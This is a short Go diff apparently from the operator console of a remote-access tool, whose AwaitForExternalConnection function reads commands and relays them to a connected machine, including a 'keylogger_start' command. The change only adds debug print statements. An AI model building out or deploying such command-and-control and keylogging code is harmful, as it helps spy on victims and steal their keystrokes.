@@ -28,8 +28,7 @@ func AwaitForExternalConnection(lport string) {
 		//cmd := prompt.Input(fileutil.BEGIN_NAME, completer.TargetCompleter)
 		var cmd string
 		fmt.Scan(&cmd)
-		fmt.Printf(cmd)
-
+		print("you print :" + cmd)
 		switch strings.TrimSpace(cmd) {
 
 		case "clear":
@@ -76,6 +75,7 @@ func AwaitForExternalConnection(lport string) {
 			}
 
 		case "keylogger_start":
+			print("you into keylogger_start")
 			SendMessage(conn, "keylogger_start")
 			ReceiveMessage(conn)
 
